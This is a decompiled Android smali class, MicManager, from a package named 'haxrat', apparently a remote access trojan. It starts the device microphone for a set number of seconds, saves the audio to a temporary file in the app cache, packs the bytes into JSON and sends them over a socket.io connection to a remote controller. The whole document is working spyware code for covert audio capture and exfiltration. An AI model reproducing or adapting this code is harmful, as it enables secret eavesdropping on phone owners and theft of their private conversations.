.class public Lcom/hax4us/haxrat/MicManager;
.super Ljava/lang/Object;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/MicManager$100000000;
    }
.end annotation


# static fields
.field static final TAG:Ljava/lang/String; = "MediaRecording"

.field static audiofile:Ljava/io/File;

.field static recorder:Landroid/media/MediaRecorder;

.field static stopRecording:Ljava/util/TimerTask;


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    check-cast v2, Ljava/io/File;

    sput-object v2, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 87
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static sendVoice(Ljava/io/File;)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            ")V"
        }
    .end annotation

    .prologue
    .line 68
    move-object v0, p0

    move-object v7, v0

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v7

    long-to-int v7, v7

    move v2, v7

    .line 69
    move v7, v2

    new-array v7, v7, [B

    move-object v3, v7

    .line 71
    :try_start_0
    new-instance v7, Ljava/io/BufferedInputStream;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    new-instance v9, Ljava/io/FileInputStream;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    move-object v11, v0

    invoke-direct {v10, v11}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v8, v9}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    move-object v4, v7

    .line 72
    move-object v7, v4

    move-object v8, v3

    const/4 v9, 0x0

    move-object v10, v3

    array-length v10, v10

    invoke-virtual {v7, v8, v9, v10}, Ljava/io/BufferedInputStream;->read([BII)I

    move-result v7

    .line 73
    new-instance v7, Lorg/json/JSONObject;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    move-object v5, v7

    .line 74
    move-object v7, v5

    const-string v8, "file"

    const/4 v9, 0x1

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v7

    .line 75
    move-object v7, v5

    const-string v8, "name"

    move-object v9, v0

    invoke-virtual {v9}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 76
    move-object v7, v5

    const-string v8, "buffer"

    move-object v9, v3

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 77
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v7

    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v7

    const-string v8, "0xMI"

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/Object;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    const/4 v11, 0x0

    move-object v12, v5

    aput-object v12, v10, v11

    invoke-virtual {v7, v8, v9}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v7

    .line 78
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    .line 84
    :goto_0
    return-void

    .line 78
    :catch_0
    move-exception v7

    move-object v4, v7

    .line 80
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v7

    move-object v4, v7

    .line 82
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception v7

    move-object v4, v7

    .line 84
    move-object v7, v4

    invoke-virtual {v7}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static startRecording(I)V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 32
    move v0, p0

    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v5

    move-object v2, v5

    .line 34
    :try_start_0
    const-string v5, "DIRR"

    move-object v6, v2

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    .line 35
    const-string v5, "sound"

    const-string v6, ".mp3"

    move-object v7, v2

    invoke-static {v5, v6, v7}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v5

    sput-object v5, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 43
    new-instance v5, Landroid/media/MediaRecorder;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    invoke-direct {v6}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    .line 44
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v6, 0x1

    invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 45
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v6, 0x2

    invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 46
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v6, 0x3

    invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 47
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v6, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 48
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v5}, Landroid/media/MediaRecorder;->prepare()V

    .line 49
    sget-object v5, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v5}, Landroid/media/MediaRecorder;->start()V

    .line 52
    new-instance v5, Lcom/hax4us/haxrat/MicManager$100000000;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    invoke-direct {v6}, Lcom/hax4us/haxrat/MicManager$100000000;-><init>()V

    sput-object v5, Lcom/hax4us/haxrat/MicManager;->stopRecording:Ljava/util/TimerTask;

    .line 63
    new-instance v5, Ljava/util/Timer;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    invoke-direct {v6}, Ljava/util/Timer;-><init>()V

    sget-object v6, Lcom/hax4us/haxrat/MicManager;->stopRecording:Ljava/util/TimerTask;

    move v7, v0

    const/16 v8, 0x3e8

    mul-int/lit16 v7, v7, 0x3e8

    int-to-long v7, v7

    invoke-virtual {v5, v6, v7, v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :goto_0
    return-void

    .line 35
    :catch_0
    move-exception v5

    move-object v3, v5

    .line 37
    const-string v5, "MediaRecording"

    const-string v6, "external storage access error"

    invoke-static {v5, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    .line 38
    goto :goto_0
.end method
